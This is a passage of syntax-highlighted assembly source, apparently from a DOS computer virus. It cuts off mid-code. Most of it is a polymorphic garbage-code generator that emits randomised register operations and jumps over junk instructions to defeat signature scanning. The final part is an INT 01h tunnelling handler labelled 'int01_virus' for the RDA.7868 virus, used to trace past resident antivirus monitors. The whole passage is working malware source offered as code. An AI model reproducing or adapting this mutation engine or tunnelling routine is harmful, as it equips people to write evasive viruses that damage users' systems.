        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">garbage_word_byte</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; correct dimension</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc6">lodsb</span><span class="sc0">                  </span><span class="sc1">; get second opcode</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">           </span><span class="sc1">; for all math ops used</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">garbage_register</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; correct register</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; gets one opcode and correct it to use the selected register (but only</span><span class="sc0">
</span><span class="sc1">; for 16bits registers)</span><span class="sc0">
</span><span class="sc5">routines_one_byte_16reg</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">garbage_word_byte</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">; only with words</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">cantcreat_ret</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">using_8_bits_register</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">cantcreat_ret</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">                   </span><span class="sc1">; load opcode</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">garbage_register</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; correct reg</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">; store</span><span class="sc0">
</span><span class="sc5">cantcreat_ret</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; just copies one byte</span><span class="sc0">
</span><span class="sc5">routines_copy_one_byte</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">      </span><span class="sc1">; skip info byte</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">           </span><span class="sc1">; read byte</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">           </span><span class="sc1">; store byte</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; just copies one word</span><span class="sc0">
</span><span class="sc5">routines_copy_one_word</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">      </span><span class="sc1">; skip info byte</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">           </span><span class="sc1">; read word</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">           </span><span class="sc1">; store word</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; just copies the given number of bytes (ie. some fake int routines and such)</span><span class="sc0">
</span><span class="sc5">routines_copy_many_bytes</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">register_compat</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">; all regs must be</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">cant_rout_cpy</span><span class="sc0">             </span><span class="sc1">; available</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">register_compat</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">cant_rout_cpy</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">move_through_table</span><span class="sc0">  </span><span class="sc1">; get how many bytes has</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">          </span><span class="sc1">; as when reading table</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">repe</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">      </span><span class="sc1">; just copy the desired chunk as grb</span><span class="sc0">
</span><span class="sc5">cant_rout_cpy</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; generates a jump (type from the table) and some garbage to jump over</span><span class="sc0">
</span><span class="sc5">routines_manage_jumps</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">      </span><span class="sc1">; skip info byte</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">           </span><span class="sc1">; read/write jump type</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">grb_jump_place</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc1">; store actual pointer</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">using_8_bits_register</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">register_compat</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">11h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">jump_nogrb_restronax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">restrict_grb_ax_is_used</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

</span><span class="sc5">jump_nogrb_restronax</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random_limit</span><span class="sc0">    </span><span class="sc1">; how many instructions</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; the jump will jump</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc5">jump_garbage_loop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">       </span><span class="sc1">; max retries to choose reg</span><span class="sc0">

</span><span class="sc5">jump_select_usable_reg</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">select_garbage_register</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">garbage_word_byte</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">garbage_register</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">register_compat</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">loopne</span><span class="sc0">  </span><span class="sc5">jump_select_usable_reg</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">      </span><span class="sc1">; exited for too many tries?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">jump_skip_this_garbage</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">garbage_word_byte</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">jump_noneed_8bitchk</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">garbage_register</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">; if &gt; bx then no8bit</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">jump_noneed_8bitchk</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">garbage_register</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">register_compat</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">jump_skip_this_garbage</span><span class="sc0">

</span><span class="sc5">jump_noneed_8bitchk</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_instr_with_compat</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">call_generator</span><span class="sc0">

</span><span class="sc5">jump_skip_this_garbage</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">jump_garbage_loop</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">grb_jump_place</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">          </span><span class="sc1">; calculate the offset for</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">          </span><span class="sc1">; the jump</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">grb_jump_place</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">        </span><span class="sc1">; store the offset</span><span class="sc0">
</span><span class="sc5">jump_grb_returnroutine</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;    ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; service routines, put a register to a known value.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">s_routines_mov_imm_in_reg</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D2F0h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random_limit</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C6h</span><span class="sc0">            </span><span class="sc1">; mov base opcode</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">garbage_word_byte</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; correct size</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">garbage_register</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; second opcode for</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0c0h</span><span class="sc0">            </span><span class="sc1">; mov reg,imm</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">              </span><span class="sc1">; the random imm</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">garbage_word_byte</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">imm_here_is_byte</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">imm_here_is_stored</span><span class="sc0">
</span><span class="sc5">imm_here_is_byte</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

</span><span class="sc5">imm_here_is_stored</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">garbage_word_byte</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">garbage_register</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">register_compat</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">s_routines_zero_reg_with_sub_reg_reg</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc0">         </span><span class="sc1">; sub reg,reg opcode</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">garbage_word_byte</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">garbage_register</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">           </span><span class="sc1">; put both src and dest to</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">          </span><span class="sc1">; the given register</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">garbage_register</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">s_routines_zero_reg_with_xor_reg_reg</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">30h</span><span class="sc0">         </span><span class="sc1">; xor reg,reg opcode</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">garbage_word_byte</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">garbage_register</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">           </span><span class="sc1">; put both src and dest to</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">          </span><span class="sc1">; the given register</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">garbage_register</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">s_routines_and_reg_with_zero</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">      </span><span class="sc1">; and reg,imm opcode 1</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">garbage_word_byte</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E0h</span><span class="sc0">     </span><span class="sc1">; and reg,imm opcode 2</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">garbage_register</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">garbage_word_byte</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; has lenght, so nr of imms</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; and with zero</span><span class="sc0">
        </span><span class="sc6">repe</span><span class="sc0"> </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">s_routines_or_reg_with_ffff</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">      </span><span class="sc1">; or reg,imm opcode 1</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">garbage_word_byte</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C8h</span><span class="sc0">     </span><span class="sc1">; or reg,imm opcode 2</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">garbage_register</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">garbage_word_byte</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; has lenght, so nr of imms</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">     </span><span class="sc1">; or with -1</span><span class="sc0">
        </span><span class="sc6">repe</span><span class="sc0"> </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;    ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ</span><span class="sc0">

</span><span class="sc5">int01_virus</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Interrupt 01h of RDA.7868</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">tunnel_addr</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">tunnel_addr</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">tunnel_addr</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">tunnel_addr</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">sp_</span><span class="sc4">],</span><span class="sc8">sp</span><span class="sc0">     </span><span class="sc1">; Store stack pointer</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Save AX at stack</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; Save CS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Load AX from stack (CS)</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">tunnel_addr</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">exam_tun_int</span><span class="sc0">    </span><span class="sc1">; Tunneling own segment? Jump to e...</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">tun_exit_off</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">tunnel_addr</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">int01_exit</span><span class="sc0">      </span><span class="sc1">; Finnished tunneling? Jump to int...</span><span class="sc0">
</span><span class="sc5">exam_tun_int</span><span class="sc4">:</span><span class="sc0">
